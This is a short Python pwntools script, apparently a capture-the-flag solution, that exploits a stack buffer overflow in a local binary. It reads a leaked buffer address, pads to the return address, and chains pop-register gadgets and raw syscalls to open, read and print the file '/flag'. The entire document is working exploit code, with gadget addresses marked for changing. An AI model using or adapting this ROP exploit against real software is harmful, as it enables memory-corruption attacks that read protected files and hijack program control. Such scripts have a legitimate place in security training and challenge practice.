from pwn import *

p = process(sys.argv[1])

p.recvuntil(b"Your input buffer is located at: ")
leak = p.recvline().strip().decode()
buf_addr = int(leak.rstrip('.'), 16)

#CHANGE
pop_rdi = 0x401c5a  # pop rdi; ret
pop_rsi = 0x401c4a  # pop rsi; ret
pop_rdx = 0x401c2a  # pop rdx; ret
pop_rax = 0x401c42  # pop rax; ret
syscall = 0x401c62  # syscall
offset = (0x50+8)


flag_str = b"/flag\0"
remaining_padding = offset - len(flag_str) 

# Build payload
payload = flag_str                    
payload += b'A' * remaining_padding

# Open file
payload += p64(pop_rdi)
payload += p64(buf_addr)  
payload += p64(pop_rsi)
payload += p64(0)                
payload += p64(pop_rax)
payload += p64(2)                
payload += p64(syscall)

# Read file
payload += p64(pop_rdi)
payload += p64(3)                 
payload += p64(pop_rsi)
payload += p64(buf_addr + 0x300)  
payload += p64(pop_rdx)
payload += p64(100)              
payload += p64(pop_rax)
payload += p64(0)                
payload += p64(syscall)

# Write to stdout
payload += p64(pop_rdi)
payload += p64(1)                 
payload += p64(pop_rsi)
payload += p64(buf_addr + 0x300) 
payload += p64(pop_rdx)
payload += p64(100)               
payload += p64(pop_rax)
payload += p64(1)                
payload += p64(syscall)

p.sendline(payload)
print(p.readallS()) 